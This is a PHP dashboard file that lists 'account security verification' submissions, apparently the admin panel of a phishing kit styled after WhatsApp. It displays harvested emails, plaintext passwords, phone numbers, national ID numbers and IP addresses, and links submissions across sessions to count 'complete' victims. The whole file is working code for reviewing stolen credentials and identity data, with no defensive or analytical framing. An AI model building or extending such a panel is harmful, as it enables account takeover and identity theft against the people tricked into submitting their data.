<?php
// dashboard.php - View submitted verification records

$dbFile = __DIR__ . '/records_db.json';
$data = [];

if (file_exists($dbFile)) {
    $json = file_get_contents($dbFile);
    $data = json_decode($json, true) ?? [];
}

// Sort: newest first
$data = array_reverse($data);

// Stats
$total = count($data);
$emailSubmissions = count(array_filter($data, fn($e) => ($e['type'] ?? '') === 'email_lock'));
$geoSubmissions = count(array_filter($data, fn($e) => ($e['type'] ?? '') === 'geo_lock'));

// Correlate sessions
$sessions = [];
foreach ($data as $entry) {
    $s = $entry['session'] ?? '';
    if ($s) {
        if (!isset($sessions[$s])) {
            $sessions[$s] = ['email' => [], 'geo' => []];
        }
        $type = $entry['type'] ?? '';
        if ($type === 'email_lock') {
            $sessions[$s]['email'][] = $entry;
        } elseif ($type === 'geo_lock') {
            $sessions[$s]['geo'][] = $entry;
        }
    }
}
$completeSessions = count(array_filter($sessions, fn($s) => !empty($s['email']) && !empty($s['geo'])));
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Verification Records — Dashboard</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: system-ui, -apple-system, sans-serif; background: #efeae2; padding: 20px; }
        .header { max-width: 1200px; margin: 0 auto 20px; }
        .header h1 { font-size: 24px; color: #075e54; }
        .header .sub { font-size: 14px; color: #667781; margin-top: 4px; }
        .stats { display: flex; gap: 16px; margin: 16px 0; flex-wrap: wrap; }
        .stat-box {
            background: #fff; padding: 16px 24px; border-radius: 8px;
            box-shadow: 0 1px 2px rgba(0,0,0,0.08); flex: 1; min-width: 120px;
        }
        .stat-box .num { font-size: 28px; font-weight: 700; color: #075e54; }
        .stat-box .label { font-size: 12px; color: #8696a0; }
        .controls { margin-bottom: 16px; }
        .controls button {
            background: #075e54; color: #fff; border: none;
            padding: 8px 18px; border-radius: 6px; cursor: pointer; font-size: 13px;
        }
        .controls button:hover { background: #064c43; }
        .controls button.danger { background: #c0392b; }
        .controls button.danger:hover { background: #a93226; }
        table {
            width: 100%; max-width: 1200px; margin: 0 auto;
            border-collapse: collapse; background: #fff;
            border-radius: 8px; overflow: hidden; box-shadow: 0 1px 2px rgba(0,0,0,0.08);
        }
        th {
            background: #075e54; color: #fff; padding: 12px 14px;
            text-align: left; font-size: 12px; text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        td { padding: 10px 14px; border-bottom: 1px solid #f0f0f0; font-size: 13px; vertical-align: top; }
        tr:hover td { background: #f8f9fa; }
        .type-badge {
            display: inline-block; padding: 2px 8px; border-radius: 12px;
            font-size: 11px; font-weight: 600;
        }
        .type-badge.email { background: #d9fdd3; color: #075e54; }
        .type-badge.geo { background: #dcf8c6; color: #1a6e3b; }
        .password-cell { font-family: monospace; color: #c0392b; max-width: 150px; overflow: hidden; text-overflow: ellipsis; }
        .empty { text-align: center; padding: 60px; color: #8696a0; }
        .empty h2 { font-size: 20px; margin-bottom: 8px; }
        .session-group { margin-bottom: 12px; }
        .session-header {
            background: #f0f7f6; padding: 8px 14px; border-radius: 6px;
            font-size: 12px; color: #075e54; margin-top: 8px;
        }
        .note {
            max-width: 1200px; margin: 20px auto 0;
            background: #fff3cd; border: 1px solid #ffc107; border-radius: 8px;
            padding: 14px 18px; font-size: 13px; color: #856404;
        }
    </style>
</head>
<body>

<div class="header">
    <h1>Verification Records Dashboard</h1>
    <div class="sub">Submitted account security verification data</div>
    <div class="stats">
        <div class="stat-box">
            <div class="num"><?= $total ?></div>
            <div class="label">Total Submissions</div>
        </div>
        <div class="stat-box">
            <div class="num"><?= $emailSubmissions ?></div>
            <div class="label">Email Lock Records</div>
        </div>
        <div class="stat-box">
            <div class="num"><?= $geoSubmissions ?></div>
            <div class="label">Geo Info Records</div>
        </div>
        <div class="stat-box">
            <div class="num"><?= $completeSessions ?></div>
            <div class="label">Complete Sessions</div>
        </div>
    </div>
    <div class="controls">
        <form method="POST" style="display:inline;">
            <?php if ($total > 0): ?>
                <button type="submit" formaction="?clear=1" class="danger">Clear All Records</button>
            <?php endif; ?>
        </form>
    </div>
</div>

<?php if (isset($_GET['clear'])): ?>
<?php
    file_put_contents($dbFile, json_encode([], JSON_PRETTY_PRINT));
    header('Location: dashboard.php');
    exit;
?>
<?php endif; ?>

<?php if ($total === 0): ?>
    <div class="empty">
        <h2>No records yet</h2>
        <p>Submit data through the verification form to see it appear here.</p>
    </div>
<?php else: ?>
    <table>
        <thead>
            <tr>
                <th>#</th>
                <th>Type</th>
                <th>Time</th>
                <th>Email</th>
                <th>Password</th>
                <th>Country</th>
                <th>Phone</th>
                <th>ID Number</th>
                <th>IP Address</th>
                <th>Session</th>
            </tr>
        </thead>
        <tbody>
            <?php $i = 1; foreach ($data as $entry): ?>
            <tr>
                <td><?= $i++ ?></td>
                <td>
                    <?php $type = $entry['type'] ?? ''; ?>
                    <span class="type-badge <?= $type === 'email_lock' ? 'email' : ($type === 'geo_lock' ? 'geo' : '') ?>">
                        <?= $type === 'email_lock' ? 'Email' : ($type === 'geo_lock' ? 'Geo' : $type) ?>
                    </span>
                </td>
                <td style="font-size:12px;color:#8696a0;"><?= htmlspecialchars($entry['time'] ?? '') ?></td>
                <td><?= htmlspecialchars($entry['email'] ?? '-') ?></td>
                <td class="password-cell"><?= htmlspecialchars($entry['password'] ?? '-') ?></td>
                <td><?= htmlspecialchars($entry['country_code'] ?? '-') ?></td>
                <td><?= htmlspecialchars(($entry['country_code'] ?? '') . ($entry['phone'] ?? '')) ?></td>
                <td><?= htmlspecialchars($entry['id_number'] ?? '-') ?></td>
                <td style="font-family:monospace;font-size:12px;color:#555;"><?= htmlspecialchars($entry['ip'] ?? '') ?></td>
                <td style="font-size:10px;color:#999;"><?= htmlspecialchars(substr($entry['session'] ?? '', 0, 12)) ?>...</td>
            </tr>
            <?php endforeach; ?>
        </tbody>
    </table>
<?php endif; ?>

</body>
</html>